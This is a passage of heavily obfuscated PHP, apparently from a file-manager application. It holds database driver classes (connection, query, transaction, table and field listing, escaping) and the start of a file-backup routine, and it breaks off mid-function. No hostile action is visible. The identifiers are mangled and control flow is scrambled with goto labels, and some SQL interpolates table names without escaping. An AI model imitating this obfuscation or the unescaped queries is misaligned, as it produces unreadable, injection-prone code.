$FÑ„‚°©§˜[33]), $FÑ„‚°©§˜[34] => $cÆ½ÎÌ›ùò[$FÑ„‚°©§˜[35]], $FÑ„‚°©§˜[36] => strtolower($cÆ½ÎÌ›ùò[$FÑ„‚°©§˜[37]]) == $FÑ„‚°©§˜[38], $FÑ„‚°©§˜[39] => strtolower($cÆ½ÎÌ›ùò[$FÑ„‚°©§˜[40]]) == $FÑ„‚°©§˜[41]); } } return $e†áêÃß®¾; } public function getTables($F®¦˜ã„” = '') { $B‚´ŒõÃ´Õ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e‹¡íˆš¤ = !empty($F®¦˜ã„”) ? $B‚´ŒõÃ´Õ[816] . $F®¦˜ã„” : $B‚´ŒõÃ´Õ[817]; $A·æ‘ˆ‘ãÑ = $this->query($e‹¡íˆš¤); $Fõ¤­¾óèÇ = array(); if ($A·æ‘ˆ‘ãÑ) { foreach ($A·æ‘ˆ‘ãÑ as $d®íˆÁŸ­² => $DŠ¾ªÃæº¼) { $Fõ¤­¾óèÇ[$d®íˆÁŸ­²] = current($DŠ¾ªÃæº¼); } } return $Fõ¤­¾óèÇ; } public function replace($Aö“ĞÒªœğ, $eâÁ´¹˜µ = array()) { $aÈ„–÷àäÎ =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($Aö“ĞÒªœğ as $dÎ±ó‚ó„Ô => $AÔÉšŒ®È¦) { $c³‰Ëƒ—Ë = $this->parseValue($AÔÉšŒ®È¦); if (is_scalar($c³‰Ëƒ—Ë)) { $b÷Ñé‘‡ß[] = $c³‰Ëƒ—Ë; $B–…à„‚[] = $this->parseKey($dÎ±ó‚ó„Ô); } } $bÉœ¢ˆÛÊİ = $aÈ„–÷àäÎ[818] . $this->parseTable($eâÁ´¹˜µ[$aÈ„–÷àäÎ[267]]) . $aÈ„–÷àäÎ[819] . implode($aÈ„–÷àäÎ[47], $B–…à„‚) . $aÈ„–÷àäÎ[820] . implode($aÈ„–÷àäÎ[47], $b÷Ñé‘‡ß) . $aÈ„–÷àäÎ[821]; return $this->execute($bÉœ¢ˆÛÊİ); } public function insertAll($cÖî«É¹Å, $a¤–Œéà è = array(), $b–Û©ëÙï¯ = false) { goto bòâàÚßÎ; c¤Ë»—¢Ú: $b«èê•—…˜ = ($b–Û©ëÙï¯ ? $A¾ç¦ƒ§Æ[823] : $A¾ç¦ƒ§Æ[824]) . $A¾ç¦ƒ§Æ[825] . $this->parseTable($a¤–Œéà è[$A¾ç¦ƒ§Æ[267]]) . $A¾ç¦ƒ§Æ[819] . implode($A¾ç¦ƒ§Æ[47], $D¥ÕÕ»ªá–) . $A¾ç¦ƒ§Æ[826] . implode($A¾ç¦ƒ§Æ[47], $Aº˜ÉÏš•ª); return $this->execute($b«èê•—…˜); goto cŠÔ—‹¦á’; eö–Ú†Ó—: $Aº˜ÉÏš•ª = array(); foreach ($cÖî«É¹Å as $eÕõ«İİ–§) { $fôÜ£™íæ† = array(); foreach ($eÕõ«İİ–§ as $Cê©ïˆˆá => $F×İ¥í¶¾‰) { $F×İ¥í¶¾‰ = $this->parseValue($F×İ¥í¶¾‰); if (is_scalar($F×İ¥í¶¾‰)) { $fôÜ£™íæ†[] = $F×İ¥í¶¾‰; } } $Aº˜ÉÏš•ª[] = $A¾ç¦ƒ§Æ[248] . implode($A¾ç¦ƒ§Æ[47], $fôÜ£™íæ†) . $A¾ç¦ƒ§Æ[821]; } array_walk($D¥ÕÕ»ªá–, array($this, $A¾ç¦ƒ§Æ[822])); goto c¤Ë»—¢Ú; bòâàÚßÎ: $A¾ç¦ƒ§Æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!is_array($cÖî«É¹Å[0])) { return !1; } $D¥ÕÕ»ªá– = array_keys($cÖî«É¹Å[0]); goto eö–Ú†Ó—; cŠÔ—‹¦á’: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $cİ…Èê¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->error = $this->_linkID->errno . $cİ…Èê¸[4] . $this->_linkID->error; if ($cİ…Èê¸[33] != $this->queryStr) { $this->error .= LNG($cİ…Èê¸[45]) . $this->queryStr; } think_trace($this->error, $cİ…Èê¸[33], $cİ…Èê¸[46]); return $this->error; } public function escapeString($e×¶¯Óø»Ù) { if ($this->_linkID) { return $this->_linkID->real_escape_string($e×¶¯Óø»Ù); } else { return addslashes($e×¶¯Óø»Ù); } } public function parseKey(&$f™Íƒííå, $B¤¸†š”ÊÖ = true) { $dßÎæ¼Ù× =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($B¤¸†š”ÊÖ) { $f™Íƒííå = $this->parseKeyCheck($f™Íƒííå); } if ($f™Íƒííå != $dßÎæ¼Ù×[176] && !preg_match($dßÎæ¼Ù×[827], $f™Íƒííå)) { $f™Íƒííå = $dßÎæ¼Ù×[828] . trim($f™Íƒííå, $dßÎæ¼Ù×[828]) . $dßÎæ¼Ù×[828]; } return $f™Íƒííå; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($cË˜êë“Ğ™ = '') { $e›œÃÍŠØ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!class_exists($e›œÃÍŠØ[830])) { think_exception(think_lang($e›œÃÍŠØ[10]) . $e›œÃÍŠØ[831]); } if (!empty($cË˜êë“Ğ™)) { $this->config = $cË˜êë“Ğ™; if (empty($this->config[$e›œÃÍŠØ[13]])) { $this->config[$e›œÃÍŠØ[13]] = array(); } } } public function connect($fÁÚ‘ğæƒ = '', $b¯ê‰«ŞÍ = 0) { $DÄƒÆË™­Ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($this->linkID[$b¯ê‰«ŞÍ])) { goto AÏİÇŠ„é“; DŠÙÛÎßºÎ: $this->linkID[$b¯ê‰«ŞÍ]->exec($DÄƒÆË™­Ø[841] . think_config($DÄƒÆË™­Ø[808])); $this->connected = !0; if (1 != think_config($DÄƒÆË™­Ø[18])) { unset($this->config); } goto càÉ†´­ø; C•ÃäÙ«·¢: $this->dbType = $this->_getDsnType($fÁÚ‘ğæƒ[$DÄƒÆË™­Ø[832]]); if (in_array($this->dbType, array($DÄƒÆË™­Ø[833], $DÄƒÆË™­Ø[834], $DÄƒÆË™­Ø[835], $DÄƒÆË™­Ø[836]))) { think_exception($DÄƒÆË™­Ø[837] . $this->dbType . $DÄƒÆË™­Ø[838] . $this->dbType . $DÄƒÆË™­Ø[839]); } if (!$this->linkID[$b¯ê‰«ŞÍ]) { think_exception($DÄƒÆË™­Ø[840]); } goto DŠÙÛÎßºÎ; AÏİÇŠ„é“: if (empty($fÁÚ‘ğæƒ)) { $fÁÚ‘ğæƒ = $this->config; } if ($this->pconnect) { $fÁÚ‘ğæƒ[$DÄƒÆË™­Ø[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$b¯ê‰«ŞÍ] = new PDO($fÁÚ‘ğæƒ[$DÄƒÆË™­Ø[832]], $fÁÚ‘ğæƒ[$DÄƒÆË™­Ø[805]], $fÁÚ‘ğæƒ[$DÄƒÆË™­Ø[806]], $fÁÚ‘ğæƒ[$DÄƒÆË™­Ø[13]]); } catch (PDOException $A™ŒğİËÚï) { think_exception($A™ŒğİËÚï->getMessage()); } goto C•ÃäÙ«·¢; càÉ†´­ø: } return $this->linkID[$b¯ê‰«ŞÍ]; } public function free() { $this->PDOStatement = null; } public function query($B­®ù¤Ø¬, $d¿çº˜ßí = array()) { goto C†„ñøØ°Ü; dÎÔÅ×Ú½ö: think_action_status($AëĞœÈÌµ¦[19], 1); think_status($AëĞœÈÌµ¦[20]); $this->PDOStatement = $this->_linkID->prepare($B­®ù¤Ø¬); goto bñÆœ¦•¬; FÛ‰ôŞ½˜—: $this->queryStr = $B­®ù¤Ø¬; if (!empty($d¿çº˜ßí)) { $this->queryStr .= $AëĞœÈÌµ¦[842] . print_r($d¿çº˜ßí, !0) . $AëĞœÈÌµ¦[843]; } if (!empty($this->PDOStatement)) { $this->free(); } goto dÎÔÅ×Ú½ö; E‚–¿‡¥Ï˜: if (!1 === $døÇîËê›¡) { $this->error(); return !1; } else { return $this->getAll(); } goto d§»„ªœ‚ˆ; bñÆœ¦•¬: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $døÇîËê›¡ = $this->PDOStatement->execute($d¿çº˜ßí); $this->debug(); goto E‚–¿‡¥Ï˜; C†„ñøØ°Ü: $AëĞœÈÌµ¦ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÛ‰ôŞ½˜—; d§»„ªœ‚ˆ: } public function execute($A¼‰Ö¦ÊÚŞ, $féĞÃ“‚§ = array()) { goto AìÒìõ®¸; f­§Şè­º£: $B•êÅæç¼ = $this->PDOStatement->execute($féĞÃ“‚§); $this->debug(); if (!1 === $B•êÅæç¼) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($aæ‰¶‡‡²§ || preg_match($Bš‚¡ŸÃÖƒ[848], $A¼‰Ö¦ÊÚŞ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Añ†¦°‹Ì“; c«ôÏ´“„ˆ: think_status($Bš‚¡ŸÃÖƒ[20]); $this->PDOStatement = $this->_linkID->prepare($A¼‰Ö¦ÊÚŞ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto f­§Şè­º£; AìÒìõ®¸: $Bš‚¡ŸÃÖƒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BîØù–µÅ±; BîØù–µÅ±: $this->queryStr = $A¼‰Ö¦ÊÚŞ; if (!empty($féĞÃ“‚§)) { $this->queryStr .= $Bš‚¡ŸÃÖƒ[842] . print_r($féĞÃ“‚§, !0) . $Bš‚¡ŸÃÖƒ[843]; } $aæ‰¶‡‡²§ = !1; goto DßÈà­„‚ù; DßÈà­„‚ù: if ($this->dbType == $Bš‚¡ŸÃÖƒ[836]) { if (preg_match($Bš‚¡ŸÃÖƒ[844], $this->queryStr, $açÅ“ŠÂé)) { $this->table = think_config($Bš‚¡ŸÃÖƒ[845]) . str_ireplace(think_config($Bš‚¡ŸÃÖƒ[846]), $Bš‚¡ŸÃÖƒ[361], $açÅ“ŠÂé[2]); $aæ‰¶‡‡²§ = (bool) $this->query($Bš‚¡ŸÃÖƒ[847] . strtoupper($this->table) . $Bš‚¡ŸÃÖƒ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Bš‚¡ŸÃÖƒ[21], 1); goto c«ôÏ´“„ˆ; Añ†¦°‹Ì“: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¥ñ”Ó¾Ü§ = $this->_linkID->commit(); $this->transTimes = 0; if (!$C¥ñ”Ó¾Ü§) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $AŒ‹Š»ç’† = $this->_linkID->rollback(); $this->transTimes = 0; if (!$AŒ‹Š»ç’†) { $this->error(); return !1; } } return !0; } private function getAll() { $côÙİå³½ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($côÙİå³½); return $côÙİå³½; } public function getFields($C†¡óÑë­¸) { goto bœ–¦ÈÇ×; B¼¤øÕÄŞŠ: return $e¦ÎÉ÷‚ô½; goto D¼ãª·õË“; aŒ¥´‚šÀ: $BÙ«„ÖƒÎ = $this->query($BÀ˜İ˜°ˆ); $e¦ÎÉ÷‚ô½ = array(); if ($BÙ«„ÖƒÎ) { foreach ($BÙ«„ÖƒÎ as $b‹¥è†ïÙ… => $f’¨Õ’×ù¸) { $f’¨Õ’×ù¸ = array_change_key_case($f’¨Õ’×ù¸); $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[28]] = isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[28]]) ? $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[28]] : $FùÓõÈÎ ‘[361]; $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[29]] = isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[29]]) ? $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[29]] : $FùÓõÈÎ ‘[361]; $fª©£‘Çğ¢ = isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[261]]) ? $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[261]] : $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[28]]; $e¦ÎÉ÷‚ô½[$fª©£‘Çğ¢] = array($FùÓõÈÎ ‘[28] => $fª©£‘Çğ¢, $FùÓõÈÎ ‘[29] => $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[29]], $FùÓõÈÎ ‘[31] => (bool) (isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[99]]) && $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[99]] === $FùÓõÈÎ ‘[33] || isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[31]]) && $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[31]] === $FùÓõÈÎ ‘[33]), $FùÓõÈÎ ‘[34] => isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[34]]) ? $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[34]] : (isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[53]]) ? $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[53]] : $FùÓõÈÎ ‘[361]), $FùÓõÈÎ ‘[36] => isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[89]]) ? strtolower($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[89]]) == $FùÓõÈÎ ‘[38] : (isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[54]]) ? $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[54]] : !1), $FùÓõÈÎ ‘[39] => isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[865]]) ? strtolower($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[865]]) == $FùÓõÈÎ ‘[41] : (isset($f’¨Õ’×ù¸[$FùÓõÈÎ ‘[89]]) ? $f’¨Õ’×ù¸[$FùÓõÈÎ ‘[89]] : !1)); } } goto B¼¤øÕÄŞŠ; bœ–¦ÈÇ×: $FùÓõÈÎ ‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!0); if (think_config($FùÓõÈÎ ‘[849])) { $BÀ˜İ˜°ˆ = str_replace($FùÓõÈÎ ‘[850], $C†¡óÑë­¸, think_config($FùÓõÈÎ ‘[849])); } else { switch ($this->dbType) { case $FùÓõÈÎ ‘[833]: case $FùÓõÈÎ ‘[851]: $BÀ˜İ˜°ˆ = "\123\x45\114\x45\103\124\x20\x20\x20\x63\157\154\165\x6d\x6e\x5f\x6e\141\x6d\145\x20\x61\163\x20\47\116\x61\155\x65\47\54\40\x20\x20\144\x61\164\x61\x5f\x74\171\160\x65\x20\141\163\x20\x27\x54\171\x70\145\47\x2c\x20\40\x20\143\x6f\154\x75\x6d\x6e\x5f\x64\145\x66\141\x75\x6c\x74\x20\141\x73\40\x27\104\145\146\141\165\154\164\47\54\x20\x20\40\151\163\137\x6e\x75\x6c\x6c\x61\x62\154\x65\x20\x61\x73\x20\47\x4e\165\x6c\154\x27\xa\x9\x9\106\122\117\x4d\x9\151\x6e\146\157\162\155\x61\164\x69\x6f\156\x5f\163\143\x68\145\x6d\141\56\164\141\142\x6c\145\163\40\x41\x53\40\x74\xa\11\x9\112\x4f\111\116\x9\151\x6e\x66\157\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\150\x65\155\x61\56\143\157\154\x75\x6d\x6e\163\x20\x41\123\x20\143\12\11\x9\117\x4e\40\40\x74\x2e\x74\x61\142\154\145\x5f\143\x61\x74\141\154\x6f\x67\40\75\x20\x63\x2e\164\x61\x62\x6c\145\x5f\143\x61\164\141\154\x6f\x67\12\x9\x9\x41\116\104\x20\164\56\164\141\142\x6c\x65\x5f\x73\143\x68\145\x6d\141\40\x3d\40\143\x2e\164\x61\142\x6c\145\137\x73\x63\150\x65\155\x61\xa\x9\11\101\x4e\x44\x20\164\56\164\x61\142\x6c\x65\137\156\141\155\x65\x20\75\40\x63\56\164\x61\x62\x6c\x65\137\x6e\x61\155\145\xa\x9\x9\x57\110\105\x52\x45\x20\40\40\x74\56\164\141\x62\154\145\x5f\156\x61\155\x65\x20\75\x20\47{$C†¡óÑë­¸}\47"; break; case $FùÓõÈÎ ‘[852]: $BÀ˜İ˜°ˆ = $FùÓõÈÎ ‘[853] . $C†¡óÑë­¸ . $FùÓõÈÎ ‘[854]; break; case $FùÓõÈÎ ‘[834]: case $FùÓõÈÎ ‘[836]: $BÀ˜İ˜°ˆ = $FùÓõÈÎ ‘[855] . $FùÓõÈÎ ‘[856] . $FùÓõÈÎ ‘[857] . strtoupper($C†¡óÑë­¸) . $FùÓõÈÎ ‘[858] . strtoupper($C†¡óÑë­¸) . $FùÓõÈÎ ‘[859]; break; case $FùÓõÈÎ ‘[860]: $BÀ˜İ˜°ˆ = $FùÓõÈÎ ‘[861] . $C†¡óÑë­¸ . $FùÓõÈÎ ‘[862]; break; case $FùÓõÈÎ ‘[835]: break; case $FùÓõÈÎ ‘[863]: default: $BÀ˜İ˜°ˆ = $FùÓõÈÎ ‘[864] . ($this->dbType == $FùÓõÈÎ ‘[863] ? "\x60{$C†¡óÑë­¸}\x60" : $C†¡óÑë­¸); } } goto aŒ¥´‚šÀ; D¼ãª·õË“: } public function getTables($Bå‹°»…³¬ = '') { $B™«‰ÜÑ‹Ğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (think_config($B™«‰ÜÑ‹Ğ[866])) { $B–ÃÊ’ = str_replace($B™«‰ÜÑ‹Ğ[867], $Bå‹°»…³¬, think_config($B™«‰ÜÑ‹Ğ[866])); } else { switch ($this->dbType) { case $B™«‰ÜÑ‹Ğ[834]: case $B™«‰ÜÑ‹Ğ[836]: $B–ÃÊ’ = $B™«‰ÜÑ‹Ğ[868]; break; case $B™«‰ÜÑ‹Ğ[833]: case $B™«‰ÜÑ‹Ğ[851]: $B–ÃÊ’ = $B™«‰ÜÑ‹Ğ[869]; break; case $B™«‰ÜÑ‹Ğ[860]: $B–ÃÊ’ = $B™«‰ÜÑ‹Ğ[870]; break; case $B™«‰ÜÑ‹Ğ[835]: think_exception(think_lang($B™«‰ÜÑ‹Ğ[871]) . $B™«‰ÜÑ‹Ğ[872]); break; case $B™«‰ÜÑ‹Ğ[852]: $B–ÃÊ’ = $B™«‰ÜÑ‹Ğ[42] . $B™«‰ÜÑ‹Ğ[43] . $B™«‰ÜÑ‹Ğ[44]; break; case $B™«‰ÜÑ‹Ğ[863]: default: if (!empty($Bå‹°»…³¬)) { $B–ÃÊ’ = $B™«‰ÜÑ‹Ğ[816] . $Bå‹°»…³¬; } else { $B–ÃÊ’ = $B™«‰ÜÑ‹Ğ[817]; } } } $fµ¾Ìõ¸İ = $this->query($B–ÃÊ’); $fÙÇ¸†™Êë = array(); foreach ($fµ¾Ìõ¸İ as $Eòé‹Öø‰ï => $bçÁ‰÷Å) { $fÙÇ¸†™Êë[$Eòé‹Öø‰ï] = current($bçÁ‰÷Å); } return $fÙÇ¸†™Êë; } protected function parseLimit($cŞÌ­ßèóÇ) { $eÙæèğ ßÉ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cŞ°µ˜é½ = $eÙæèğ ßÉ[33]; if (!empty($cŞÌ­ßèóÇ)) { switch ($this->dbType) { case $eÙæèğ ßÉ[860]: case $eÙæèğ ßÉ[852]: $cŞÌ­ßèóÇ = explode($eÙæèğ ßÉ[47], $cŞÌ­ßèóÇ); if (count($cŞÌ­ßèóÇ) > 1) { $cŞ°µ˜é½ .= $eÙæèğ ßÉ[48] . $cŞÌ­ßèóÇ[1] . $eÙæèğ ßÉ[49] . $cŞÌ­ßèóÇ[0] . $eÙæèğ ßÉ[50]; } else { $cŞ°µ˜é½ .= $eÙæèğ ßÉ[48] . $cŞÌ­ßèóÇ[0] . $eÙæèğ ßÉ[50]; } break; case $eÙæèğ ßÉ[833]: case $eÙæèğ ßÉ[851]: break; case $eÙæèğ ßÉ[835]: break; case $eÙæèğ ßÉ[834]: case $eÙæèğ ßÉ[836]: break; case $eÙæèğ ßÉ[863]: default: $cŞ°µ˜é½ .= $eÙæèğ ßÉ[48] . $cŞÌ­ßèóÇ . $eÙæèğ ßÉ[50]; } } return $cŞ°µ˜é½; } public function parseKey(&$F¸¢¯©Õè, $dØ¢„–ğä = true) { $bí¶‹¨š =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($dØ¢„–ğä) { $F¸¢¯©Õè = $this->parseKeyCheck($F¸¢¯©Õè); } if ($this->dbType == $bí¶‹¨š[863]) { if ($F¸¢¯©Õè != $bí¶‹¨š[176] && !preg_match($bí¶‹¨š[827], $F¸¢¯©Õè)) { $F¸¢¯©Õè = $bí¶‹¨š[828] . trim($F¸¢¯©Õè, $bí¶‹¨š[828]) . $bí¶‹¨š[828]; } return $F¸¢¯©Õè; } else { return parent::parseKey($F¸¢¯©Õè); } } public function close() { $this->_linkID = null; } public function error() { $D”æÍ×õ° =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->PDOStatement) { $dÄ–¤Êâñ = $this->PDOStatement->errorInfo(); $this->error = $dÄ–¤Êâñ[1] . $D”æÍ×õ°[4] . $dÄ–¤Êâñ[2]; } else { $this->error = $D”æÍ×õ°[33]; } if ($D”æÍ×õ°[33] != $this->queryStr) { $this->error .= LNG($D”æÍ×õ°[45]) . $this->queryStr; } think_trace($this->error, $D”æÍ×õ°[33], $D”æÍ×õ°[46]); return $this->error; } public function escapeString($F’Ÿ×Ç­Úß) { $BğùòŒÃÍ‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; switch ($this->dbType) { case $BğùòŒÃÍ‡[860]: case $BğùòŒÃÍ‡[833]: case $BğùòŒÃÍ‡[851]: case $BğùòŒÃÍ‡[863]: return addslashes($F’Ÿ×Ç­Úß); case $BğùòŒÃÍ‡[835]: case $BğùòŒÃÍ‡[852]: case $BğùòŒÃÍ‡[834]: case $BğùòŒÃÍ‡[836]: return str_ireplace($BğùòŒÃÍ‡[55], $BğùòŒÃÍ‡[56], $F’Ÿ×Ç­Úß); } } protected function parseValue($Bãæå«†¾Û) { $aÁñÒƒåğ– =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_string($Bãæå«†¾Û)) { $Bãæå«†¾Û = strpos($Bãæå«†¾Û, $aÁñÒƒåğ–[4]) === 0 ? $this->escapeString($Bãæå«†¾Û) : $aÁñÒƒåğ–[873] . $this->escapeString($Bãæå«†¾Û) . $aÁñÒƒåğ–[873]; } elseif (isset($Bãæå«†¾Û[0]) && is_string($Bãæå«†¾Û[0]) && strtolower($Bãæå«†¾Û[0]) == $aÁñÒƒåğ–[285]) { $Bãæå«†¾Û = $this->escapeString($Bãæå«†¾Û[1]); } elseif (is_array($Bãæå«†¾Û)) { $Bãæå«†¾Û = array_map(array($this, $aÁñÒƒåğ–[874]), $Bãæå«†¾Û); } elseif (is_bool($Bãæå«†¾Û)) { $Bãæå«†¾Û = $Bãæå«†¾Û ? $aÁñÒƒåğ–[83] : $aÁñÒƒåğ–[468]; } elseif (is_null($Bãæå«†¾Û)) { $Bãæå«†¾Û = $aÁñÒƒåğ–[99]; } return $Bãæå«†¾Û; } public function getLastInsertId() { $c°„”å‰èË =& $_SERVER[³‘’¼äÑ™ÔÍ]; switch ($this->dbType) { case $c°„”å‰èË[860]: case $c°„”å‰èË[852]: case $c°„”å‰èË[833]: case $c°„”å‰èË[851]: case $c°„”å‰èË[835]: case $c°„”å‰èË[863]: return $this->_linkID->lastInsertId(); case $c°„”å‰èË[834]: case $c°„”å‰èË[836]: $EøéªÛ’Ú‡ = $this->table; $BøÔ¸Ğáô = $this->query("\123\105\x4c\x45\x43\124\x20{$EøéªÛ’Ú‡}\x2e\143\x75\162\162\x76\x61\x6c\x20\143\165\162\162\166\x61\154\40\106\x52\117\115\40\144\165\141\154"); return $BøÔ¸Ğáô ? $BøÔ¸Ğáô[0][$c°„”å‰èË[875]] : 0; } } } goto A“öîÕÈï‚; d˜æÓĞŸ†¹: class BackupFile { public function __construct() { } public function index() { goto A¥‚×Æ‚÷ç; B¢“ãŸïİÉ: $e…Ûóê¢È¸ = !0; $cºöËÌ³Ç” = $this->storeIds(); $C‹–¯æáÂ¼ = 1; goto cåÒÈ“ôßè; A¥‚×Æ‚÷ç: $Cîè«½ÚÒ = Backup::get(); $D÷¢«†‹† = $Cîè«½ÚÒ[$_SERVER[³‘’¼äÑ™ÔÍ][281]][$_SERVER[³‘’¼äÑ™ÔÍ][167]][$_SERVER[³‘’¼äÑ™ÔÍ][419]]; $c¸ÏÜ¯œŒÆ = array($_SERVER[³‘’¼äÑ™ÔÍ][420] => array($_SERVER[³‘’¼äÑ™ÔÍ][738], $D÷¢«†‹†), $_SERVER[³‘’¼äÑ™ÔÍ][739] => array($_SERVER[³‘’¼äÑ™ÔÍ][319], $Cîè«½ÚÒ[$_SERVER[³‘’¼äÑ™ÔÍ][694]])); goto FÆê¼¨¹Ïò; F‡±½ÃèµŒ: $a’ï•ÖÊ±ñ = $e…Ûóê¢È¸ ? 1 : 0; $E°‘ë«ŒÙ˜ = array($_SERVER[³‘’¼äÑ™ÔÍ][754] => 1, $_SERVER[³‘’¼äÑ™ÔÍ][706] => time(), $_SERVER[³‘’¼äÑ™ÔÍ][712] => $a’ï•ÖÊ±ñ, $_SERVER[³‘’¼äÑ™ÔÍ][751] => $D÷¢«†‹†, $_SERVER[³‘’¼äÑ™ÔÍ][743] => $cÜ›¾Õ‡’Ì, $_SERVER[³‘’¼äÑ™ÔÍ][742] => $EŒÛÏ‰¤Õ…); if ($f¢²Ã²Â) { $E°‘ë«ŒÙ˜[$_SERVER[³‘’¼äÑ™ÔÍ][752]] = $CœŞí‰»º; $E°‘ë«ŒÙ˜[$_SERVER[³‘’¼äÑ™ÔÍ][753]] = $Dö×„œ›¼Å; } goto CÒ‹Ÿîåù‹; D‰©¶ëÃß: $Dö×„œ›¼Å = $CœŞí‰»º = 0; do { $C¤¤‰·† = $_SERVER[³‘’¼äÑ™ÔÍ][744]; $cø‚Ö˜–²¾ = Model($_SERVER[³‘’¼äÑ™ÔÍ][722])->where($c¸ÏÜ¯œŒÆ)->field($C¤¤‰·†)->order($_SERVER[³‘’¼äÑ™ÔÍ][745])->selectPage($eæÄ½ù‹³‚, $C‹–¯æáÂ¼); $d“õë˜òÙ = !empty($cø‚Ö˜–²¾[$_SERVER[³‘’¼äÑ™ÔÍ][354]]) ? $cø‚Ö˜–²¾[$_SERVER[³‘’¼äÑ™ÔÍ][354]] : array(); foreach ($d“õë˜òÙ as $Bøù®¡²†Ï) { goto FÆĞêƒ‹ƒõ; AÕ¬æáöà”: if (IO::exist($cœ—‡•Î†¨)) { $bõ”®›Á->updateFileEnd($Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][28]], $Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][77]]); } else { $cœ—‡•Î†¨ = get_path_father($cœ—‡•Î†¨); IO::mkdir($cœ—‡•Î†¨); if (!IO::copy($c¦ëö­Ãğä, $cœ—‡•Î†¨, $_SERVER[³‘’¼äÑ™ÔÍ][748])) { write_log($_SERVER[³‘’¼äÑ™ÔÍ][749] . $c¦ëö­Ãğä . $_SERVER[³‘’¼äÑ™ÔÍ][750] . $cœ—‡•Î†¨ . $_SERVER[³‘’¼äÑ™ÔÍ][476], $_SERVER[³‘’¼äÑ™ÔÍ][717]); $e…Ûóê¢È¸ = !1; break; } } $D÷¢«†‹† = $Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][419]]; $f¢²Ã²Â += 1; goto c–³íÛ´; e÷ïÕ†´ÏÏ: if ($E¼±àòŠÅ >= 1024 * 1024 * 100) { $E°‘ë«ŒÙ˜ = array($_SERVER[³‘’¼äÑ™ÔÍ][751] => $D÷¢«†‹†, $_SERVER[³‘’¼äÑ™ÔÍ][752] => $CœŞí‰»º, $_SERVER[³‘’¼äÑ™ÔÍ][753] => $Dö×„œ›¼Å); Backup::set($E°‘ë«ŒÙ˜); $E¼±àòŠÅ = $f¢²Ã²Â = 0; } goto FåËËÓÆî‚; FÆĞêƒ‹ƒõ: if (!$this->_fileExist($Bøù®¡²†Ï, $fŒ‡áŞ”õê, $cºöËÌ³Ç”)) { $EŒÛÏ‰¤Õ… -= 1; $cÜ›¾Õ‡’Ì -= (int) $Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][77]]; write_log("\x66\x69\x6c\145\40\156\x6f\x74\x20\x65\x78\151\x73\x74\x2e\x66\x69\154\x65\x49\104\x3a{$Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][419]]}\54\40\x70\141\164\150\x3a{$Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][75]]}", $_SERVER[³‘’¼äÑ™ÔÍ][746]); continue; } $c¦ëö­Ãğä = $Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][75]]; $cœ—‡•Î†¨ = "\173\x69\157\x3a{$Cîè«½ÚÒ[$_SERVER[³‘’¼äÑ™ÔÍ][694]]}\175" . substr($c¦ëö­Ãğä, strlen("\x7b\151\x6f\x3a{$Bøù®¡²†Ï[$_SERVER[³‘’¼äÑ™ÔÍ][747]]}\x7d")); goto AÕ¬æáöà”; c–³íÛ´: 